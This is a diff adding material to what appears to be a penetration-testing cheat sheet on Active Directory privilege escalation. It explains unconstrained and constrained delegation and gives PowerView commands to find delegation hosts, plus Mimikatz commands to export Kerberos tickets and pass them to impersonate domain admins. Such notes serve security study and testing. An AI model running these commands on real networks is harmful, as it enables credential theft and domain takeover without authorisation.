@@ -203,7 +203,20 @@ winPEASx64.exe
 ```
 ## Domain Privilege Escalation
 ### Unconstrained Delegation
+Delegation is the action of allowing a computer to save a user’s Kerberos authentication tickets, then use those tickets to impersonate the user and act on that user’s behalf.
+```powershell
+Check for unconstrained delegation with PowerView 
+Get-Netcomputer -UnConstrained
+Get-Netcomputer -UnConstrained | select samaccountname
+```
+Leverage Mimikatz to to check for DA tokens and export them. May have to wait for a login
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::tickets"'
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
+```
 ### Constrained Delegation 
+Constrained delegation allows the account with the “Trust this user/computer for delegation to specified services only” enabled to impersonate ANY user to access specific services listed in the allowable delegation list.
 ## Credential Access 
 I would recommend becoming familiar with different tooling that can be used to dump creds. 
 ### Mimikatz 
